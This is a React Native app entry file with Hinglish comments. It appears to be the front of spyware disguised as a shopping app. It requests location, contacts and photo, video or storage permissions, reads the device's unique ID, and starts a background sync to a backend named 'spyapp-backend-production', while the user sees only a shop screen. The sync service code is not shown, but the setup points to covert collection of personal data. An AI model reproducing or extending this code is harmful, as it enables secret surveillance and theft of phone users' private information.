import React, { useEffect, useState } from 'react';
import { StyleSheet, PermissionsAndroid, Platform } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import { ShopScreen } from './src/screens/ShopScreen';
import { startBackgroundSync } from './src/services/BackgroundSyncService';

export default function App() {
  const [deviceId, setDeviceId] = useState<string>('LOADING_ID');

  // Runtime permissions mangne ka function
  const requestPermissions = async () => {
    if (Platform.OS === 'android') {
      try {
        const grants = await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.ACCESS_COARSE_LOCATION,
          PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
          ...(Platform.Version >= 33
            ? [
                PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
                PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
              ]
            : [
                PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
                PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
              ]),
        ]);

        console.log('Permissions status:', grants);
      } catch (err) {
        console.warn('Permission request error:', err);
      }
    }
  };

  useEffect(() => {
    const initApp = async () => {
      // Pehle permissions maang lo
      await requestPermissions();

      // Phir unique device ID uthao
      const uniqueId = await DeviceInfo.getUniqueId();
      setDeviceId(uniqueId);

      // Background sync start karo
      startBackgroundSync({
        backendUrl: 'https://spyapp-backend-production.up.railway.app', // PC ka local IP - device aur PC ek WiFi pe hone chahiye
        deviceId: uniqueId,
      });
    };

    initApp();
  }, []);

  return <ShopScreen />;
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#0f1b2d' },
});